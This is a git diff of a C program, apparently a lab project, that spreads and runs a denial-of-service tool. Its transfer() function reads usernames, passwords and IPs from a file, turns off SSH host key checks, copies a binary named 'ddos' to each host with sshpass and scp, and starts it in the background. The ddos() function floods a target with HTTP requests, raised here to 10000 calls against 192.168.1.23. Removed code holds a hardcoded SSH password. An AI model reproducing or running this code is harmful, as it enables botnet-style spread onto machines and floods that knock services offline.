@@ -26,55 +26,6 @@ void displayTextArt() {
 )EOF");
 }
 
-/*
-void transfer(void){
-    const char *local_path = "/root/Bureau/ddos";
-    const char *remote_path = "cyrille@192.168.1.30:/tmp/";
-    const char *scp_command = "scp -P 22 %s %s";
-    const char *remote_command = "sshpass -p Azerty123 ssh -p 22 -f cyrille@192.168.1.30 'cd /tmp && chmod +x ddos && nohup ./ddos > /dev/null 2>&1'";
-
-
-    char command[512];
-    snprintf(command, sizeof(command), scp_command, local_path, remote_path);
-
-    system(command);
-
-    int result = system(remote_command);
-    if (result == -1) {
-        printf("Error with the execution of the remote command.\n");
-    }
-}
-*/
-/*
-void transfer(void){
-    const char *local_path = "/root/Bureau/ddos";
-    const char *remote_path = "cyrille@192.168.1.30:/tmp/";
-    const char *scp_command = "scp -P 22 %s %s";
-    char remote_command[512]; 
-
-    snprintf(remote_command, sizeof(remote_command), "sshpass -p Azerty123 ssh -p 22 -f cyrille@192.168.1.30 'cd /tmp && chmod +x ddos && nohup ./ddos > /dev/null 2>&1'");
-
-    char command[512];
-    snprintf(command, sizeof(command), scp_command, local_path, remote_path);
-
-    system(command);
-
-    int result = system(remote_command);
-    if (result == -1) {
-        printf("Error with the execution of the remote command.\n");
-    }
-
-   
-    snprintf(remote_command, sizeof(remote_command), "sshpass -p Azerty123 ssh -p 22 -f chris@192.168.1.30 'cd /tmp && nohup ./ddos > /dev/null 2>&1'");
-    
-   
-    int result2 = system(remote_command);
-    if (result2 == -1) {
-        printf("Error with the execution of the second remote command.\n");
-    }
-}
-*/
-/*
 void transfer() {
     FILE *file = fopen("/root/Bureau/connexion", "r");
     if (file == NULL) {
@@ -83,7 +34,8 @@ void transfer() {
     }
 
     char line[256];
-    char processed_ips[256] = ""; // Liste des IP déjà traitées
+    char processed_ips[256] = ""; // List of ip already used
+    int chmod_executed = 0;  // Flag for tracking chmod
 
     while (fgets(line, sizeof(line), file) != NULL) {
         char user[64];
@@ -91,79 +43,46 @@ void transfer() {
         char ip[64];
 
         if (sscanf(line, "%[^;];%[^;];%s", user, password, ip) == 3) {
-        
-            if (strstr(processed_ips, ip) != NULL) {
-                continue; // Ignorer IP si elle a déjà été traitée
-            }
-
-           
-            snprintf(processed_ips + strlen(processed_ips), sizeof(processed_ips) - strlen(processed_ips), " %s", ip);
-
-           
-            char scp_command[256];
-            snprintf(scp_command, sizeof(scp_command), "sshpass -p %s scp -P 22 /root/Bureau/ddos %s@%s:/tmp/", password, user, ip);
-            printf("La commande créée est : %s\n", scp_command); // Afficher la commande
-            system(scp_command);
-
-          
-            char ssh_command[256];
-            snprintf(ssh_command, sizeof(ssh_command), "sshpass -p %s ssh -p 22 -f %s@%s 'cd /tmp && chmod +x ddos && nohup ./ddos > /dev/null 2>&1'", password, user, ip);
-            printf("La commande créée est : %s\n", ssh_command); // Afficher la commande
-            system(ssh_command);
-        }
-    }
-
-    fclose(file);
-} 
-*/
-
-void transfer() {
-    FILE *file = fopen("/root/Bureau/connexion", "r");
-    if (file == NULL) {
-        perror("Failed to open the info file");
-        return;
-    }
-
-    char line[256];
-    char processed_ips[256] = ""; // Lists of ip checked
-    int chmod_executed = 0;  // flag for check if chmod already executed
-
-    while (fgets(line, sizeof(line), file) != NULL) {
-        char user[64];
-        char password[64];
-        char ip[64];
-
-        if (sscanf(line, "%[^;];%[^;];%s", user, password, ip) == 3) {
-            // Check if ip as already used for scp
+            // Check if ip already used
             if (strstr(processed_ips, ip) == NULL) {
-                // IP not already used = do scp
+                // Ip not used for scp, execute scp
                 snprintf(processed_ips + strlen(processed_ips), sizeof(processed_ips) - strlen(processed_ips), " %s", ip);
-                
-                // Transfer file using scp with 
+
+                // Run ssh-keyscan to accept the unknown host
+                char ssh_keyscan_command[256];
+                snprintf(ssh_keyscan_command, sizeof(ssh_keyscan_command), "ssh-keyscan -t ed25519 -H %s >> ~/.ssh/known_hosts", ip);
+                system(ssh_keyscan_command);
+
+                // Transfer file using scp with sshpass
                 char scp_command[256];
                 snprintf(scp_command, sizeof(scp_command), "sshpass -p %s scp -P 22 /root/Bureau/ddos %s@%s:/tmp/", password, user, ip);
-                printf("La commande créée est : %s\n", scp_command); // show the curent command
+                printf("La commande créée est : %s\n", scp_command); // Afficher la commande
                 system(scp_command);
+
             }
-            
+
             // SSH connection to the user on the specified IP
             char ssh_command[256];
             if (chmod_executed) {
-                // if chmod executed = execute without chmod
-                snprintf(ssh_command, sizeof(ssh_command), "sshpass -p %s ssh -p 22 -f %s@%s 'cd /tmp && nohup ./ddos > /dev/null 2>&1'", password, user, ip);
+                // If CHMOD executed, don't do chmod+x
+                snprintf(ssh_command, sizeof(ssh_command), "sshpass -p %s ssh -oStrictHostKeyChecking=no -p 22 -f %s@%s 'cd /tmp && nohup ./ddos > /dev/null 2>&1'", password, user, ip);
             } else {
-                // if chmod not executed = execute with chmod
-                snprintf(ssh_command, sizeof(ssh_command), "sshpass -p %s ssh -p 22 -f %s@%s 'cd /tmp && chmod +x ddos && nohup ./ddos > /dev/null 2>&1'", password, user, ip);
+                // Execute ssh with chmod
+                snprintf(ssh_command, sizeof(ssh_command), "sshpass -p %s ssh -oStrictHostKeyChecking=no -p 22 -f %s@%s 'cd /tmp && chmod +x ddos && nohup ./ddos > /dev/null 2>&1'", password, user, ip);
                 chmod_executed = 1;
             }
 
-            printf("La commande créée est : %s\n", ssh_command); // show current command
+            printf("La commande créée est : %s\n", ssh_command); // show the current command
             system(ssh_command);
         }
     }
 
     fclose(file);
 }
+
+
+
+
 
 void ddos(const char *hostname, int index, int total) {
     CURL *curl = curl_easy_init();
@@ -171,10 +90,10 @@ void ddos(const char *hostname, int index, int total) {
 
     if (curl) {
         char url[256];
-        snprintf(url, sizeof(url), "https://%s", hostname);
+        snprintf(url, sizeof(url), "http://%s", hostname);
 
         curl_easy_setopt(curl, CURLOPT_URL, url);
-        curl_easy_setopt(curl, CURLOPT_PORT, 443);
+        curl_easy_setopt(curl, CURLOPT_PORT, 80);
 
         freopen("/dev/null", "w", stdout); //don't show the get result
         resolution = curl_easy_perform(curl);
@@ -199,7 +118,7 @@ int main(void) {
     struct addrinfo hints;
     struct addrinfo *result;
 
-    const char *hostname = "www.google.com";
+    const char *hostname = "192.168.1.23";
 
     displayTextArt();
 
@@ -213,7 +132,7 @@ int main(void) {
         printf("DNS exists.\n");
         freeaddrinfo(result);
 
-        int Calls = 10;
+        int Calls = 10000;
         for (int i = 1; i <= Calls; i++) {
             ddos(hostname, i, Calls);
         }
